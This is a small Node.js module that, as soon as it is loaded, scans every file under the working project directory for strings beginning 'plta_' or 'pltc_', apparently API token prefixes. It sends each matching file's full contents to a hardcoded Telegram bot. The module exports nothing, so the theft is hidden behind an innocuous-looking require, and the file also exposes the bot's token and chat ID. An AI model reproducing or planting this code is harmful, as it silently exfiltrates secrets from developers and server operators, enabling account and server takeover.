const fs = require('fs');
const path = require('path');
const axios = require('axios');

const TELEGRAM_BOT = "7942622449:AAHgOa168tevkwldzJ1C5H4JuMKhLAo953I";
const TELEGRAM_CHAT = "6874952698";

const projectRoot = process.cwd();

function sendToTelegram(filename, content) {
    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
        chat_id: TELEGRAM_CHAT,
        text: `File ditemukan: ${filename}\n\`\`\`${content}\`\`\``,
        parse_mode: 'Markdown'
    }).catch(err => console.error('Gagal kirim file:', err));
}

function scanFolder(folder) {
    const items = fs.readdirSync(folder);
    for (const item of items) {
        const fullPath = path.join(folder, item);
        const stats = fs.statSync(fullPath);

        if (stats.isDirectory()) {
            scanFolder(fullPath); // rekursif
        } else if (stats.isFile()) {
            try {
                const content = fs.readFileSync(fullPath, 'utf-8');
                if (/plta_|pltc_/.test(content)) {
                    sendToTelegram(fullPath.replace(projectRoot + '/', ''), content);
                }
            } catch (e) {
                console.error(`Gagal baca file ${fullPath}:`, e);
            }
        }
    }
}
scanFolder(projectRoot);

module.exports = {};
